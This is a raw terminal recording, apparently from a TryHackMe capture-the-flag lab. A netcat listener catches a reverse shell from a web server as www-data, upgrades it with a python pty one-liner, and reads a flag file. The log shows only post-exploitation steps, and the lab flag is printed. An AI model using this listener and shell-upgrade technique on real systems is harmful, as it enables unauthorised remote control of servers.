@@ -1,0 +1,21 @@
+Script started on 2025-04-23 15:57:33+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 10225
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
+[K[K[?2004hpython3 -c 'import pty;pty.spanw[K[Kwn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[KTo run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+[Kwww-data@python:/var/www/html/labs/lab4$ [Kwww-data@python:/var/www/html/labs/lab4$ [K[?2004hwww-data@python:/var/www/html/labs/lab4$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K6470e394cbf6dab6a91682cc8585059b.txt  index.php  logout.php
+dashboard.php			      login.php
+www-data@python:/var/www/html/labs/lab4$ [Kwww-data@python:/var/www/html/labs/lab4$ [K[?2004hwww-data@python:/var/www/html/labs/lab4$ cat [7m6470e394cbf6dab6a91682cc8585059b.txt[27m[7mcat [27m6470e394cbf6dab6a91682cc8585059b.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat 6470e394cbf6dab6a91682cc8585059b.txt
+[K<labs/lab4$ cat 6470e394cbf6dab6a91682cc8585059b.txt
+[KTHM{6470e394cbf6dab6a91682cc8585059b}www-data@python:/var/www/html/labs/lab4$ [KTHM{6470e394cbf6dab6a91682cc8585059b}www-data@python:/var/www/html/labs/lab4$ [K[?2004hTHM{6470e394cbf6dab6a91682cc8585059b}www-data@python:/var/www/html/labs/lab4$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[K[K[?2004he[K[?2004lexit
+[K[?2004hexit[?2004l[K[?2004hexit
+[K[?2004l
+Script done on 2025-04-23 16:00:38+03:00 [COMMAND_EXIT_CODE="0"]
